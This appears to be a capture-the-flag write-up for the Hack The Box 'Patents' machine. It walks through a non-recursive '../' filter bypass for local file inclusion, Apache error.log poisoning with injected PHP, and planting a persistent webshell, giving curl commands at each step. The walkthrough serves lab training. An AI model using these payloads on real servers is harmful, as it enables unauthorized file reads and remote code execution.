## Overview

Patents is a Hard Linux machine built around a "MEOW Inc. Patents Management" web app that converts uploaded `.docx` files to PDF. The intended foothold is an out-of-band XXE in the converter, but there is a far more direct path: the patent-viewer page has a local file inclusion whose `../` filter is only applied once, so `....//` slips a real traversal through. That gives arbitrary file read, and Apache's `error.log` can be turned into code execution by injecting raw PHP via a 404 request and then including the log through the same LFI — a shell as `www-data` inside a Docker container, where `user.txt` is readable directly. This post goes from recon to the user flag; privilege escalation is intentionally left out.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 7.7p1 | password auth disabled |
| 80   | Apache 2.4.29 | docx→PDF "Patents Management" app |
| 8888 | lfmserver | custom file-manager protocol (root-side; used in privesc) |

```bash
nmap -sC -sV 10.129.9.186
```

Port 80 hosts the patents app: an upload form (`/upload.html` → `convert.php`) and an experimental patent viewer at `/getPatent_alphav1.0.php?id=1`. The `id` parameter is the interesting one.

## Enumeration

The viewer includes a file based on the `id` parameter. A plain `../` is stripped, but the filter runs only once and is not recursive — so `....//` (inner `../` removed, leaving a valid `../`) defeats it. That yields arbitrary file read as `www-data`:

```bash
curl -s -G "http://10.129.9.186/getPatent_alphav1.0.php" \
  --data-urlencode 'id=....//....//....//....//....//....//etc/passwd'
```

![LFI reading /etc/passwd](/assets/Images/patents-001_enum_lfi-passwd.png)

The app's `config.php` confirms the viewer is the vulnerable script and that uploads land in a `letsgo/` directory — a writable, web-served path we'll use for a stable shell.

## Foothold

PHP wrappers are blocked (the include prepends a fixed directory), and the usual `access.log` poisoning fails here because `access.log` is a symlink to `/dev/stdout`. The reliable channel is **`error.log`**: a request to a non-existent `.php` whose URL **path** contains PHP makes Apache log that path *unencoded* in its "File does not exist" message. PHP's own include-warning lines in the same log are HTML-encoded and therefore inert, so only our injected payload executes when the log is included.

Inject raw PHP via a 404 (single quotes, so the combined-log format doesn't escape and break the parse):

```bash
curl -s "http://10.129.9.186/$(python3 -c "import urllib.parse;print(urllib.parse.quote('<?php system(\$_GET[z]); ?>'))")ZZ.php"
```

Then include `error.log` through the LFI and pass a command:

```bash
curl -s -G "http://10.129.9.186/getPatent_alphav1.0.php" \
  --data-urlencode 'id=....//....//....//....//....//....//var/log/apache2/error.log' \
  --data-urlencode 'z=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![RCE as www-data via error.log poisoning](/assets/Images/patents-002_foothold_rce-www-data.png)

Drop a stable webshell into the writable, web-served upload directory so we don't have to re-poison a racy log:

```bash
B64=$(printf '<?php system($_GET[0]); ?>' | base64 -w0)
curl -s -G "http://10.129.9.186/getPatent_alphav1.0.php" \
  --data-urlencode 'id=....//....//....//....//....//....//var/log/apache2/error.log' \
  --data-urlencode "z=mkdir -p /var/www/html/docx2pdf/letsgo; echo $B64|base64 -d > /var/www/html/docx2pdf/letsgo/s.php"
curl -s "http://10.129.9.186/letsgo/s.php?0=id"
```

![Stable webshell as www-data](/assets/Images/patents-003_foothold_rce-www-data.png)

## User flag

The shell lands inside a Docker container, and `user.txt` is world-readable from there:

```bash
cat /home/gbyolo/user.txt   # HTB{...}
```

![user.txt captured](/assets/Images/patents-004_foothold_user-flag.png)

Access as `gbyolo`'s container achieved.
